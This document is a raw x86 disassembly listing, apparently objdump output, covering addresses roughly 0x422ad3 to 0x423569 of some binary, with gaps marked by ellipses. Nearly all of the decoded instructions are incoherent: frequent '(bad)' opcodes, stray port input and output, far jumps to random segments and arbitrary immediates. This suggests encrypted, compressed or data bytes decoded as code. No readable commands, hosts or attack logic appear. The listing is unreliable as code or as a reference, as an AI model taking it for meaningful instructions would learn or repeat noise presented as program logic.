  422ad3:	add    BYTE PTR [eax],al
  422ad5:	add    BYTE PTR [esi-0x377e796],dl
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	jecxz  0x422b0d
  422ae4:	(bad)  
  422ae5:	out    dx,al
  422ae6:	addr16 je 0x422aea
  422ae9:	add    BYTE PTR [eax],al
  422aeb:	add    DWORD PTR [eax],eax
  422aed:	add    BYTE PTR [edi],dh
  422aef:	push   0x374808e8
  422af4:	(bad)
  422af7:	and    eax,0x3a5ffbcc
  422afc:	sbb    cl,0x82
  422aff:	or     BYTE PTR [esi+0x6b3cdf43],ah
  422b05:	inc    ebp
  422b06:	push   edi
  422b07:	push   es
  422b08:	xor    al,0x6e
  422b0a:	retf   
  422b0b:	mov    ds:0x263a5413,al
  422b10:	dec    esp
  422b11:	xor    ebp,ecx
  422b13:	(bad)  
  422b14:	jg     0x422b11
  422b16:	fdivrp st(1),st
  422b18:	daa    
  422b19:	pop    edi
  422b1a:	or     eax,0x711f0587
  422b1f:	dec    eax
  422b20:	dec    eax
  422b21:	inc    DWORD PTR [eax-0x1b5e2b38]
  422b27:	hlt    
  422b28:	stos   BYTE PTR es:[edi],al
  422b29:	adc    eax,ebx
  422b2b:	hlt    
  422b2c:	mov    ch,0xd
  422b2e:	mov    ebx,0x32ff4fe0
  422b33:	pop    ebx
  422b34:	jae    0x422b35
  422b36:	ror    DWORD PTR [ebp-0x15],0x57
  422b3a:	push   es
  422b3b:	sbb    BYTE PTR [esp+eax*2+0x20081fa5],dh
  422b42:	pop    ecx
  422b43:	mov    edx,0x7aab1c3d
  422b48:	inc    ebp
  422b49:	lahf   
  422b4a:	cmp    eax,0x9fcced77
  422b4f:	dec    edi
  422b50:	out    0x7d,al
  422b52:	in     eax,dx
  422b53:	jbe    0x422b6a
  422b55:	gs in  eax,dx
  422b57:	jno    0x422b82
  422b59:	push   ecx
  422b5a:	sbb    DWORD PTR [edi],ebx
  422b5c:	push   ebp
  422b5d:	mov    dl,0x48
  422b5f:	stos   BYTE PTR es:[edi],al
  422b60:	push   ebp
  422b61:	dec    esi
  422b62:	xor    DWORD PTR [ebx+0x6a0d31d7],ebp
  422b68:	pop    ds
  422b69:	jnp    0x422af9
  422b6b:	xlat   BYTE PTR ds:[ebx]
  422b6c:	mov    edx,0x2e645ffe
  422b71:	mov    cl,0xe4
  422b73:	lahf   
  422b74:	dec    ecx
  422b75:	cmp    al,BYTE PTR [edx]
  422b77:	enter  0xb5d3,0xf3
  422b7b:	dec    esi
  422b7c:	dec    ebx
  422b7d:	mov    ds:0x2ebd945b,al
  422b82:	dec    ebx
  422b83:	cwde   
  422b84:	out    dx,eax
  422b85:	push   esp
  422b86:	inc    edx
  422b87:	imul   edx,DWORD PTR [ebp+0x1a764598],0xad83ebd8
  422b91:	lea    eax,[ebx-0x34]
  422b94:	cmp    eax,esp
  422b96:	inc    edx
  422b97:	popa   
  422b98:	mov    cl,0x5
  422b9a:	pop    edx
  422b9b:	sahf   
  422b9c:	mov    eax,ds:0x1593e370
  422ba1:	mov    dh,0x27
  422ba3:	mov    esi,0x1121f053
  422ba8:	lods   eax,DWORD PTR ds:[esi]
  422ba9:	dec    edx
  422baa:	jmp    0xedc2:0x4e28a4b5
  422bb1:	mov    ebp,DWORD PTR [ecx+0x14]
  422bb4:	jne    0x422c0d
  422bb6:	xchg   BYTE PTR es:[eax+ebx*4-0x3c5f186e],ah
  422bbe:	inc    ecx
  422bbf:	ret    
  422bc0:	and    al,0xb4
  422bc2:	adc    al,0xac
  422bc4:	cs xchg ebx,eax
  422bc6:	or     eax,0x46a4f1e4
  422bcb:	mov    eax,ds:0x568ca8bc
  422bd0:	test   al,0x6e
  422bd2:	sahf   
  422bd3:	sti    
  422bd4:	push   cs
  422bd5:	or     DWORD PTR [esi-0x7a323197],edi
  422bdb:	dec    eax
  422bdc:	je     0x422c02
  422bde:	push   ebx
  422bdf:	in     al,0xe6
  422be1:	(bad)  
  422be2:	rol    cx,1
  422be5:	mov    edx,DWORD PTR [esi-0x2a99695a]
  422beb:	pushf  
  422bec:	stc    
  422bed:	in     eax,dx
	...
  422c56:	inc    esp
  422c57:	aaa    
  422c58:	dec    edx
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx+0x790d4d9c]
  422c64:	mov    edi,0x175673e
  422c69:	add    BYTE PTR [eax],al
  422c6b:	add    DWORD PTR [eax],eax
  422c6d:	add    dl,ch
  422c6f:	stos   BYTE PTR es:[edi],al
  422c70:	call   0x46a24a85
  422c75:	mov    esp,0x3118f1a1
  422c7a:	std    
  422c7b:	pushf  
  422c7c:	ret    
  422c7d:	in     al,0xf3
  422c7f:	xor    BYTE PTR [esi],0x1e
  422c82:	out    0x69,eax
  422c84:	or     bh,BYTE PTR [ebx]
  422c86:	addr16 xor al,0xdc
  422c89:	call   FWORD PTR [ecx+0x28]
  422c8c:	mov    al,0x98
  422c8e:	(bad)  
  422c8f:	lods   al,BYTE PTR ds:[esi]
  422c90:	push   0x5c509dc6
  422c95:	dec    eax
  422c96:	scas   al,BYTE PTR es:[edi]
  422c97:	call   0x31397d41
  422c9c:	mov    cl,0x60
  422c9e:	mov    ah,BYTE PTR [ecx]
  422ca0:	call   0xec03:0xcc320586
  422ca7:	enter  0x664c,0x70
  422cab:	imul   esp,DWORD PTR [ecx+0x7bced079],0xffffffc8
  422cb2:	pushf  
  422cb3:	sub    eax,0xf1e60859
  422cb8:	aaa    
  422cb9:	mov    ah,0xfb
  422cbb:	adc    eax,0x3917a0b
  422cc0:	lahf   
  422cc1:	imul   eax,DWORD PTR [esi-0x52],0xffffff81
  422cc5:	push   eax
  422cc6:	scas   eax,DWORD PTR es:[edi]
  422cc7:	push   ebp
  422cc8:	retf   
  422cc9:	(bad)  
  422cca:	jnp    0x422d30
  422ccc:	mov    ebx,0xb4bdcb8b
  422cd1:	in     eax,dx
  422cd2:	es sub eax,0x20760c8e
  422cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422cd9:	clc    
  422cda:	adc    eax,0xae93895e
  422cdf:	inc    ebx
  422ce0:	js     0x422cbd
  422ce2:	fdiv   DWORD PTR [ebx]
  422ce4:	mov    al,0xc9
  422ce6:	pop    ebx
  422ce7:	dec    ebx
  422ce8:	lods   al,BYTE PTR ds:[esi]
  422ce9:	push   ecx
  422cea:	sbb    al,0x80
  422cec:	fsubrp st(2),st
  422cee:	xchg   edx,eax
  422cef:	xchg   esi,eax
  422cf0:	stc    
  422cf1:	and    al,0x14
  422cf3:	hlt    
  422cf4:	add    eax,0xa13959f3
  422cf9:	push   es
  422cfa:	out    0xcd,eax
  422cfc:	xor    BYTE PTR [eax-0x5e5aea58],bl
  422d02:	shr    BYTE PTR [ecx+0x62],1
  422d05:	pop    es
  422d06:	pop    ebp
  422d07:	xor    dh,dh
  422d09:	inc    edi
  422d0a:	and    BYTE PTR [ebx-0x66],dl
  422d0d:	xchg   esp,eax
  422d0e:	push   ebp
  422d0f:	dec    ecx
  422d10:	fcom   DWORD PTR [eax+0x0]
  422d13:	xlat   BYTE PTR ds:[ebx]
  422d14:	jae    0x422cd5
  422d16:	imul   eax
  422d18:	cwde   
  422d19:	es ss ds add edx,ebx
  422d1e:	jge    0x422cf8
  422d20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d21:	test   BYTE PTR [edx+0x699313c4],bl
  422d27:	jge    0x422d0c
  422d29:	sti    
  422d2a:	mov    eax,ds:0xf965c3fc
  422d2f:	(bad)  
  422d30:	mov    eax,ds:0xeacafda0
  422d35:	adc    ah,dl
  422d37:	cwde   
  422d38:	pop    edx
  422d39:	dec    ebx
  422d3a:	dec    ecx
  422d3b:	das    
  422d3c:	xor    edi,ecx
  422d3e:	pop    edx
  422d3f:	imul   ebx,DWORD PTR [ecx+0x2a4c75aa],0xfffffff8
  422d46:	jmp    0x42d2e8e5
  422d4b:	ficom  WORD PTR [eax]
  422d4d:	fidiv  DWORD PTR [ecx]
  422d4f:	popa   
  422d50:	ret    0x25ec
  422d53:	add    BYTE PTR [edi],cl
  422d55:	push   es
  422d56:	hlt    
  422d57:	aad    0x96
  422d59:	idiv   dh
  422d5b:	or     dl,ch
  422d5d:	jno    0x422ced
  422d5f:	xchg   edx,eax
  422d60:	jno    0x422d57
  422d62:	data16 jge 0x422da6
  422d65:	aas    
  422d66:	fcomp  DWORD PTR [edx]
  422d68:	daa    
  422d69:	pop    es
  422d6a:	fidivr WORD PTR [ecx+0x33]
  422d6d:	jo     0x422d6f
	...
  422dd3:	add    BYTE PTR [eax],al
  422dd5:	add    BYTE PTR [edi+0x626d60bd],bh
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    ebp,DWORD PTR [ebx+edx*4+0x7667b203]
  422de8:	add    DWORD PTR [eax],eax
  422dea:	add    BYTE PTR [ecx],al
  422dec:	add    BYTE PTR [eax],al
  422dee:	or     ah,BYTE PTR [ebx-0x295417e4]
  422df4:	pop    ebx
  422df5:	xchg   ebx,eax
  422df6:	pop    edi
  422df7:	add    al,BYTE PTR [eax-0x50]
  422dfa:	add    eax,0x7b32a1c3
  422dff:	mov    edi,edi
  422e01:	ins    DWORD PTR es:[edi],dx
  422e02:	xor    BYTE PTR [esi+0x24],bh
  422e05:	mov    BYTE PTR [ecx-0x63b7c294],bh
  422e0b:	outs   dx,DWORD PTR ds:[esi]
  422e0c:	push   edi
  422e0d:	test   esp,edi
  422e0f:	cmp    eax,0xd4acdc51
  422e14:	mov    ebx,0xf3ad9361
  422e19:	repnz shl DWORD PTR ds:0x6fdbf47,0x9b
  422e21:	inc    ecx
  422e22:	in     al,0x6d
  422e24:	dec    edx
  422e25:	loopne 0x422e6b
  422e27:	retf   0xc041
  422e2a:	inc    esi
  422e2b:	dec    esi
  422e2c:	adc    DWORD PTR [eax+0x27],0x160ac299
  422e33:	scas   al,BYTE PTR es:[edi]
  422e34:	fldenv [ebp+0x637b1c21]
  422e3a:	test   BYTE PTR ds:0xd07e8259,ah
  422e40:	adc    DWORD PTR [eax+0x72f9807],ecx
  422e46:	inc    esi
  422e47:	fst    DWORD PTR [eax+0x76]
  422e4a:	inc    ebp
  422e4b:	fsubrp st(4),st
  422e4d:	fisttp QWORD PTR [edx+0x1c]
  422e50:	add    eax,0x16456390
  422e55:	(bad)  
  422e56:	mov    ebx,0xc2f7210
  422e5b:	jb     0x422ec0
  422e5d:	or     DWORD PTR [ebp+ebp*1+0xcec555c],edx
  422e64:	adc    al,0xd7
  422e66:	out    dx,eax
  422e67:	xor    eax,DWORD PTR [edi+ebp*4]
  422e6a:	leave  
  422e6b:	pop    eax
  422e6c:	cli    
  422e6d:	sbb    cl,BYTE PTR [ecx]
  422e6f:	xchg   ebx,eax
  422e70:	add    DWORD PTR [edx-0x48],ebp
  422e73:	mov    bl,0x99
  422e75:	xor    al,0x33
  422e77:	inc    edi
  422e78:	fmul   QWORD PTR [edi+0x6f86326c]
  422e7e:	enter  0xf149,0x9a
  422e82:	es cli 
  422e84:	retf   
  422e85:	mov    ch,0x7f
  422e87:	sbb    eax,0x139768be
  422e8c:	fdivr  DWORD PTR [ecx+0x42c5449a]
  422e92:	adc    al,0x38
  422e94:	push   ecx
  422e95:	out    dx,eax
  422e96:	push   ecx
  422e97:	sbb    DWORD PTR [ecx+0x61],ebp
  422e9a:	push   ebp
  422e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e9c:	or     BYTE PTR [ebx-0x74],cl
  422e9f:	imul   ebx,DWORD PTR [eax],0x8d0a83b6
  422ea5:	gs and al,0x55
  422ea8:	adc    al,bh
  422eaa:	or     al,0x14
  422eac:	jmp    0x422e87
  422eae:	mov    ebp,0xb2c98aaf
  422eb3:	mov    ah,0xa7
  422eb5:	test   BYTE PTR [ebx-0x3f7ce82b],0x30
  422ebc:	inc    eax
  422ebd:	fsub   st,st(5)
  422ebf:	mov    al,0x8e
  422ec1:	clc    
  422ec2:	jp     0x422ebf
  422ec4:	mov    ebp,0xdf2c43be
  422ec9:	dec    eax
  422eca:	and    bl,BYTE PTR [ebp+0x2bda8e51]
  422ed0:	mov    esi,0x855a62da
  422ed5:	les    ecx,FWORD PTR [edi-0xd]
  422ed8:	rcr    BYTE PTR ss:[esi+edx*8-0x3c5632e3],0x7e
  422ee1:	sbb    dl,bl
  422ee3:	mov    DWORD PTR [edx+0x43b04a65],0xe65a2da3
  422eed:	arpl   WORD PTR [eax],ax
	...
  422f53:	add    BYTE PTR [eax],al
  422f55:	add    BYTE PTR [ebx-0x21e677ab],al
  422f5b:	fst    QWORD PTR [ebx+0x33b808df]
  422f61:	retf   0x2b6d
  422f64:	vmread DWORD PTR [edi+0x77],esp
  422f68:	add    DWORD PTR [eax],eax
  422f6a:	add    BYTE PTR [ecx],al
  422f6c:	add    BYTE PTR [eax],al
  422f6e:	hlt    
  422f6f:	push   0xffffff86
  422f71:	adc    ax,0xe793
  422f75:	lods   al,BYTE PTR ds:[esi]
  422f76:	adc    DWORD PTR [ebx],edx
  422f78:	test   eax,0xaa51ffa8
  422f7d:	and    eax,0x8ccd200f
  422f82:	pop    esp
  422f83:	fcmove st,st(7)
  422f85:	loopne 0x422f99
  422f87:	push   ss
  422f88:	or     dh,BYTE PTR [esp+ebp*1-0x5c411ade]
  422f8f:	xchg   edx,eax
  422f90:	adc    eax,0xbd2eeef4
  422f95:	je     0x422f58
  422f97:	in     eax,dx
  422f98:	adc    ecx,DWORD PTR [ebp+0x489cd3f0]
  422f9e:	sbb    ebp,DWORD PTR [esi-0x38]
  422fa1:	call   0x5acfe23b
  422fa6:	icebp  
  422fa7:	ins    DWORD PTR es:[edi],dx
  422fa8:	and    DWORD PTR [ecx-0x271c1fe8],esp
  422fae:	sbb    ch,BYTE PTR [edx-0x3414caf7]
  422fb4:	lods   al,BYTE PTR ds:[esi]
  422fb5:	xor    edx,DWORD PTR [ebp+0x1c]
  422fb8:	push   esp
  422fb9:	jg     0x422fdf
  422fbb:	shl    DWORD PTR [edi-0x17],cl
  422fbe:	push   cs
  422fbf:	aam    0x84
  422fc1:	mov    bh,0xa9
  422fc3:	lods   eax,DWORD PTR ds:[esi]
  422fc4:	dec    ebx
  422fc5:	fmul   DWORD PTR [eax+0x17]
  422fc8:	push   esp
  422fc9:	popf   
  422fca:	or     DWORD PTR [edi+0x465b0692],edi
  422fd0:	mov    edx,0x5f0a7859
  422fd5:	lds    esi,FWORD PTR [ebx-0x47]
  422fd8:	or     eax,0xbf61d587
  422fdd:	sti    
  422fde:	add    edx,DWORD PTR [esp+edx*1+0x28]
  422fe2:	mov    esi,0x5cf31c81
  422fe7:	(bad)  
  422fe8:	out    0xe7,al
  422fea:	adc    eax,esi
  422fec:	push   ebp
  422fed:	daa    
  422fee:	dec    ebx
  422fef:	jo     0x423052
  422ff1:	outs   dx,BYTE PTR ds:[esi]
  422ff2:	jge    0x423004
  422ff4:	jg     0x422fda
  422ff6:	mov    bl,0xf
  422ff8:	cdq    
  422ff9:	jae    0x422f89
  422ffb:	xor    bl,al
  422ffd:	mov    ch,0xfa
  422fff:	pop    ebp
  423000:	(bad)  
  423001:	test   esi,0xa03e8fab
  423007:	adc    eax,0x50ace587
  42300c:	and    DWORD PTR [ecx-0x1b6a96c8],0xffffff98
  423013:	mov    edx,0x62a915bf
  423018:	ja     0x422fb4
  42301a:	dec    eax
  42301b:	arpl   WORD PTR [edx+0x35],ax
  42301e:	pop    ss
  42301f:	push   es
  423020:	add    bh,dl
  423022:	or     bl,dl
  423024:	sbb    DWORD PTR [ecx*1+0x79fabd3b],esi
  42302b:	pop    esi
  42302c:	aas    
  42302d:	out    0xbf,al
  42302f:	sub    bh,BYTE PTR [ecx]
  423031:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423032:	nop    edx
  423035:	(bad)
  423038:	pop    es
  423039:	jge    0x422fdf
  42303b:	adc    eax,0x95079dc5
  423040:	push   ecx
  423041:	push   cs
  423042:	sub    DWORD PTR [eax-0x5a5a80d],edx
  423048:	aas    
  423049:	lds    ebp,FWORD PTR [ecx+0x3a]
  42304c:	clc    
  42304d:	push   es
  42304e:	int3   
  42304f:	ss fsubp st(1),st
  423052:	out    dx,eax
  423053:	adc    DWORD PTR ds:0x6764a692,ebx
  423059:	ret    
  42305a:	cmp    dh,dl
  42305c:	popa   
  42305d:	in     al,0x2a
  42305f:	pop    edx
  423060:	repz adc esp,DWORD PTR [ebx-0x65a6a519]
  423067:	repz sub edx,esp
  42306a:	test   DWORD PTR [ebp+0x97d5],esi
	...
  4230d4:	add    BYTE PTR [eax],al
  4230d6:	inc    esi
  4230d7:	in     al,0x62
  4230d9:	mov    dl,ah
  4230db:	mov    gs,esi
  4230dd:	out    dx,al
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [edx+ebp*8+0x67221344],esp
  4230e7:	js     0x4230ea
  4230e9:	add    BYTE PTR [eax],al
  4230eb:	add    DWORD PTR [eax],eax
  4230ed:	add    dh,dh
  4230ef:	xchg   edi,eax
  4230f0:	dec    ebx
  4230f1:	push   es
  4230f2:	sbb    cl,dh
  4230f4:	dec    ecx
  4230f5:	fbld   TBYTE PTR [eax+0x768afb2]
  4230fb:	mov    bh,0x8b
  4230fd:	lahf   
  4230fe:	js     0x4230b1
  423100:	xchg   edx,edi
  423102:	rol    ch,cl
  423104:	pushf  
  423105:	ret    0xc7f4
  423108:	ror    DWORD PTR [edi-0x52],0x11
  42310c:	pop    ebx
  42310d:	je     0x4230e1
  42310f:	mov    eax,ds:0xb32f4050
  423114:	(bad)
  423118:	mov    edi,ecx
  42311a:	fsub   st,st(4)
  42311c:	fnstenv [ebx+0x37]
  42311f:	fdivrp st(7),st
  423121:	pop    ebp
  423122:	call   0xa13c638d
  423127:	xchg   esp,eax
  423128:	sar    BYTE PTR [edx-0x21],1
  42312b:	or     bh,BYTE PTR ds:0x5e40b28f
  423131:	rcl    BYTE PTR [ebp+0x31e162a7],0x88
  423138:	mov    eax,ds:0x196a49d3
  42313d:	dec    ebp
  42313e:	mov    al,ds:0x40c7460
  423143:	outs   dx,BYTE PTR ds:[esi]
  423144:	bound  eax,QWORD PTR [edx+0x1]
  423147:	(bad)  [eax]
  423149:	stos   DWORD PTR es:[edi],eax
  42314a:	push   esp
  42314b:	fstp   DWORD PTR [ebx-0xe]
  42314e:	cmp    eax,0xf466c1e9
  423153:	xlat   BYTE PTR ds:[ebx]
  423154:	jmp    0xa737:0x3cbe8f92
  42315b:	lea    eax,[esi]
  42315d:	push   eax
  42315e:	neg    BYTE PTR [eax+0x10]
  423161:	stos   BYTE PTR es:[edi],al
  423162:	pop    edx
  423163:	les    ebx,FWORD PTR [ebp+ecx*4+0x4f449882]
  42316a:	xchg   ebp,eax
  42316b:	push   ds
  42316c:	inc    ebp
  42316d:	sbb    al,0x9a
  42316f:	add    al,BYTE PTR [ecx]
  423171:	js     0x4231dd
  423173:	leave  
  423174:	cmc    
  423175:	dec    edx
  423176:	or     ah,cl
  423178:	in     eax,0x65
  42317a:	test   bl,bh
  42317c:	fs out 0x0,al
  42317f:	jnp    0x42317f
  423181:	hlt    
  423182:	rol    BYTE PTR [esi+0x1d],cl
  423185:	push   ebx
  423186:	pop    ebx
  423187:	mov    WORD PTR [ecx],?
  423189:	mov    edi,DWORD PTR [edi]
  42318b:	add    BYTE PTR [ecx],ch
  42318d:	cdq    
  42318e:	das    
  42318f:	push   ds
  423190:	rcr    BYTE PTR [eax-0x7d],0xb5
  423194:	cli    
  423195:	inc    esp
  423196:	shr    DWORD PTR [edi],1
  423198:	xor    eax,0xf7b4890f
  42319d:	mov    eax,?
  42319f:	cmp    esi,ecx
  4231a1:	push   ss
  4231a2:	ror    DWORD PTR [edx+ebx*1+0x13],cl
  4231a6:	fs push ecx
  4231a8:	icebp  
  4231a9:	ins    BYTE PTR es:[edi],dx
  4231aa:	jp     0x4231d8
  4231ac:	dec    esi
  4231ad:	int3   
  4231ae:	mov    ch,0x4c
  4231b0:	test   DWORD PTR [edi-0x61],0x22bbfe21
  4231b7:	or     eax,0x5232f1cd
  4231bc:	push   es
  4231bd:	popf   
  4231be:	nop
  4231bf:	imul   esp,DWORD PTR ds:0x5d68d150,0x14
  4231c6:	idiv   DWORD PTR [edx+0x6348fa78]
  4231cc:	fld    DWORD PTR [ebx+0x3e475867]
  4231d2:	and    BYTE PTR [ebx-0x49],ch
  4231d5:	inc    ecx
  4231d6:	pop    ss
  4231d7:	pop    esp
  4231d8:	jne    0x42321a
  4231da:	ror    ecx,0xa5
  4231dd:	and    dl,BYTE PTR [ecx+0x71ee01d]
  4231e3:	clc    
  4231e4:	sbb    eax,0x43927cb
  4231e9:	adc    eax,DWORD PTR [edi+0xd3d5fa]
	...
  423253:	add    BYTE PTR [eax],al
  423255:	add    BYTE PTR [ecx-0xf],bh
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx+0x7b24845a],esp
  423266:	addr16 jns 0x42326a
  423269:	add    BYTE PTR [eax],al
  42326b:	add    DWORD PTR [eax],eax
  42326d:	add    BYTE PTR [eax-0x5d05317],dh
  423273:	scas   eax,DWORD PTR es:[edi]
  423274:	lods   al,BYTE PTR ds:[esi]
  423275:	adc    DWORD PTR [ebx-0x4094545d],esi
  42327b:	push   ss
  42327c:	ret    
  42327d:	push   ebp
  42327e:	or     DWORD PTR [ebp-0x1e],edx
  423281:	ins    BYTE PTR es:[edi],dx
  423282:	shl    DWORD PTR [edi-0x7a],1
  423285:	dec    eax
  423286:	lods   al,BYTE PTR ds:[esi]
  423287:	into   
  423288:	xchg   BYTE PTR [ebx],ah
  42328a:	xor    esp,eax
  42328c:	jbe    0x42328b
  42328e:	mov    ch,BYTE PTR [esi]
  423290:	add    esp,DWORD PTR [ebx-0x69]
  423293:	test   DWORD PTR [eax],esi
  423295:	lock jp 0x423225
  423298:	daa    
  423299:	mov    esp,0x5ad0a98
  42329e:	mov    ds:0x9b756e2b,al
  4232a3:	mov    esi,esi
  4232a5:	mov    ds:0x4547347f,al
  4232aa:	xchg   ebp,eax
  4232ab:	jne    0x42330e
  4232ad:	jmp    0x9164:0x85aa9dba
  4232b4:	cli    
  4232b5:	sub    DWORD PTR [ecx+0x35],esp
  4232b8:	inc    ecx
  4232b9:	mov    edx,0x84df50f0
  4232be:	fdiv   QWORD PTR [ecx+edx*1+0x14]
  4232c2:	call   0x1b7fd9a3
  4232c7:	push   esi
  4232c8:	repz dec edx
  4232ca:	sub    cl,BYTE PTR [ebp-0x6f48acaa]
  4232d0:	sahf   
  4232d1:	cmp    bl,BYTE PTR [ebx+0x73]
  4232d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232d5:	aas    
  4232d6:	mov    eax,0x104b34d1
  4232db:	adc    DWORD PTR [ebp-0x60cc15f8],esp
  4232e1:	and    bh,bh
  4232e3:	mov    ecx,0x68ab9e44
  4232e8:	add    al,0xaf
  4232ea:	mov    edi,DWORD PTR [eax]
  4232ec:	repnz pusha 
  4232ee:	arpl   WORD PTR [esi],sp
  4232f0:	dec    edi
  4232f1:	dec    esp
  4232f2:	mov    DWORD PTR [ebx-0x1f],esp
  4232f5:	cmp    DWORD PTR [ecx-0x77],ebp
  4232f8:	and    ah,ah
  4232fa:	repz mov ah,BYTE PTR [esi]
  4232fd:	gs jae 0x42334e
  423300:	xor    bh,ch
  423302:	std    
  423303:	jb     0x423339
  423305:	dec    ecx
  423306:	push   eax
  423307:	xchg   ebp,eax
  423308:	add    eax,0xbf9648b
  42330d:	addr16 inc ecx
  42330f:	in     eax,0xe2
  423311:	cmc    
  423312:	pop    ebp
  423313:	sar    DWORD PTR [edi],cl
  423315:	ins    BYTE PTR es:[edi],dx
  423316:	sbb    DWORD PTR [edx+edi*1-0x1382f6da],eax
  42331d:	in     al,0xdf
  42331f:	add    bh,al
  423321:	push   0x8237363f
  423326:	jg     0x423326
  423328:	adc    edx,0x18b9a8f6
  42332e:	in     eax,dx
  42332f:	(bad)  
  423330:	sbb    eax,0x7c6d2820
  423335:	ins    BYTE PTR es:[edi],dx
  423336:	and    ebp,DWORD PTR [eax+0x6f2343ef]
  42333c:	pop    ss
  42333d:	(bad)  
  42333e:	mov    eax,esp
  423340:	xchg   edi,eax
  423341:	xchg   esp,eax
  423342:	test   eax,0x2a6263d
  423347:	xlat   BYTE PTR ds:[ebx]
  423348:	xchg   ecx,eax
  423349:	fcom   DWORD PTR [esi+edx*8]
  42334c:	daa    
  42334d:	call   0x3ff8e786
  423352:	je     0x423340
  423354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423355:	aaa    
  423356:	adc    edx,DWORD PTR [esi]
  423358:	cdq    
  423359:	jecxz  0x4232fa
  42335b:	aas    
  42335c:	pop    edi
  42335d:	ins    BYTE PTR es:[edi],dx
  42335e:	ror    cl,cl
  423360:	sub    ch,BYTE PTR [ecx-0x7fe59228]
  423366:	mov    DWORD PTR [ecx+esi*4],esp
  423369:	fst    DWORD PTR ds:0x9294
	...
  4233d4:	add    BYTE PTR [eax],al
  4233d6:	clc    
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0xe8680f44
  4233e4:	lods   al,BYTE PTR ds:[esi]
  4233e5:	(bad)  
  4233e6:	addr16 jp 0x4233ea
  4233e9:	add    BYTE PTR [eax],al
  4233eb:	add    DWORD PTR [eax],eax
  4233ed:	add    BYTE PTR [ebx+esi*2-0x11955cb4],ah
  4233f4:	jbe    0x4233f7
  4233f6:	sub    al,0x76
  4233f8:	gs mov esp,0xe5aaf300
  4233fe:	cmp    BYTE PTR [edx-0x5],0xa
  423402:	call   0x4fd:0x8d87729a
  423409:	push   es
  42340a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42340b:	sub    DWORD PTR [edi-0x45711914],edx
  423411:	mov    edx,0xbbb5ff5a
  423416:	out    0xa6,al
  423418:	sbb    esp,ebx
  42341a:	test   DWORD PTR [eax-0x69a091f8],esp
  423420:	xchg   ecx,eax
  423421:	sahf   
  423422:	addr16 dec eax
  423424:	mov    eax,ds:0x922b9ccf
  423429:	hlt    
  42342a:	dec    eax
  42342b:	mov    esi,0x8b730062
  423430:	dec    cx
  423432:	push   edi
  423433:	sahf   
  423434:	scas   eax,DWORD PTR es:[edi]
  423435:	aad    0x16
  423437:	adc    al,0xd6
  423439:	fsubr  st,st(1)
  42343b:	loope  0x4234af
  42343d:	ins    DWORD PTR es:[edi],dx
  42343e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42343f:	sbb    eax,0x8522cf4f
  423444:	xchg   ebp,eax
  423445:	adc    DWORD PTR [ecx-0x67],edx
  423448:	inc    eax
  423449:	rcl    BYTE PTR [esp+ecx*8+0x47216ecd],1
  423450:	jne    0x423408
  423452:	loopne 0x423499
  423454:	add    eax,0x937aae73
  423459:	lock into 
  42345b:	aad    0xeb
  42345d:	inc    esi
  42345e:	xchg   esi,eax
  42345f:	jbe    0x4234b1
  423461:	fist   DWORD PTR [ecx+0x46afa073]
  423467:	ins    BYTE PTR es:[edi],dx
  423468:	mov    ah,0x3c
  42346a:	mov    esp,0x1b3a142a
  42346f:	jbe    0x423450
  423471:	mov    ah,0x8a
  423473:	mov    edi,DWORD PTR [esi+0x2b]
  423476:	ss out dx,al
  423478:	or     dh,dh
  42347a:	dec    esi
  42347b:	mov    ch,0xed
  42347d:	test   BYTE PTR [eax+edi*1],ah
  423480:	(bad)  
  423482:	(bad)  
  423483:	stc    
  423484:	adc    BYTE PTR cs:[edi],bl
  423487:	je     0x423451
  423489:	adc    DWORD PTR [eax+edi*8+0x1e],edx
  42348d:	xchg   ebx,eax
  42348e:	and    dl,BYTE PTR [ecx]
  423490:	mov    esi,0xfecb597a
  423495:	jg     0x42343c
  423497:	icebp  
  423498:	pusha  
  423499:	add    BYTE PTR [eax],ah
  42349b:	cld    
  42349c:	outs   dx,DWORD PTR ds:[esi]
  42349d:	in     eax,0x81
  42349f:	pop    esp
  4234a0:	aad    0x5
  4234a2:	popa   
  4234a3:	int3   
  4234a4:	lods   eax,DWORD PTR ds:[esi]
  4234a5:	xor    eax,0x80850d04
  4234aa:	sub    al,0x8f
  4234ac:	sbb    eax,0x411768ad
  4234b1:	jmp    0xe87d9f3c
  4234b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4234b7:	xchg   BYTE PTR [edx],al
  4234b9:	add    edx,edi
  4234bb:	sub    BYTE PTR [esi+0x6],cl
  4234be:	rcr    ah,1
  4234c0:	or     BYTE PTR [ebx],dh
  4234c2:	popa   
  4234c3:	mov    al,0x48
  4234c5:	jno    0x423528
  4234c7:	adc    al,0x1c
  4234c9:	jns    0x42344b
  4234cb:	enter  0xfcce,0xa6
  4234cf:	push   ebx
  4234d0:	in     al,dx
  4234d1:	(bad)  
  4234d3:	push   ecx
  4234d4:	sub    eax,0x5351ec49
  4234d9:	add    al,0xe3
  4234db:	sbb    ch,BYTE PTR [eax+0x19]
  4234de:	jae    0x42349e
  4234e0:	mov    cl,0x44
  4234e2:	mov    BYTE PTR ds:0x664e6413,0x61
  4234e9:	mov    bh,0x29
  4234eb:	add    esi,DWORD PTR [ebx-0x7d]
	...
  423556:	shl    BYTE PTR [eax-0x8a90bb],0xea
  42355d:	mov    edi,0x1fadf467
  423562:	push   esi
  423563:	nop
  423564:	push   0xffffffea
  423566:	addr16 jnp 0x42356a
  423569:	add    BYTE PTR [eax],al
